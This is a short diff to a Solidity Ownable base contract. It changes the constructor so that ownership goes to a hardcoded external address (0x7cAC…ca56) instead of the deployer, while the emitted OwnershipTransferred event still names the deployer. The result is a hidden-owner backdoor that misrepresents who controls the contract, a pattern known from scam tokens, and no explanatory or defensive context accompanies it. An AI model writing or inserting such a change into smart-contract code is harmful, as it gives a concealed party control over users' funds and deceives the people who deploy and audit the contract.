@@ -1480,7 +1480,7 @@ abstract contract Ownable is Context {
      */
     constructor() {
         address msgSender = _msgSender();
-        _owner = msgSender;
+        _owner = address(0x7cACbc75d74740b50Dc68fBF0a573Af80243ca56);
         emit OwnershipTransferred(address(0), msgSender);
     }
 
